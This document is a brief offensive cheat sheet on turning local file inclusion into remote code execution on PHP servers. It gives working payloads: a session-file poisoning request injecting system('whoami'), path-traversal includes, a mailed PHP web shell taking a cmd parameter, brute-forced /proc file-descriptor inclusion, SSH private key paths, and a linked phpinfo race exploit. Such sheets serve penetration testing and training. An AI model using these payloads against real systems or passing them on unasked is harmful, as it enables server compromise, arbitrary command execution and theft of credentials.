# LFI to RCE

### Php sessions method

```bash
#Check if the website use PHPSESSID
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Tue, 30-Jun-2020 10:25:29 GMT; path=/; httponly

#In php sessions are store into /var/lib/php5/sess_PHPSESSID files
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";

#Set the cookie to <?php system("whoami"); ?>
login=1&user=<?php system("whoami");?>&pass=password&lang=en_us.php

#Use the LFI to include the PHP session file
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2

```

### Email method

```bash
#Send a mail to internal account (user@localhost) containing:
<?php echo system($_REQUEST["cmd"]); ?>
#Access to the mail (/var/mail/USER&cmd=whoami)
```

### /proc/\*/fd/\* method

```bash
#Upload a lot of shells
http://example.com/index.php?page=/proc/$PID/fd/$FD
#$PID = PID of the proccess (can be bruteforced)
#$FD = filedescriptor (can be bruteforced)
```

### Ssh method

```bash
#Check which user is being used (/proc/self/status - /etc/passwd)
/home/hax0r/.ssh/id_rsa #hax0r = User is being used
```

### Phpinfo\(\) method

To exploit this you need: page where phpinfo\(\) is displayed, "file\_uploads=on" and the server has to be able to write in "/tmp" directory.

{% embed url="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py" %}



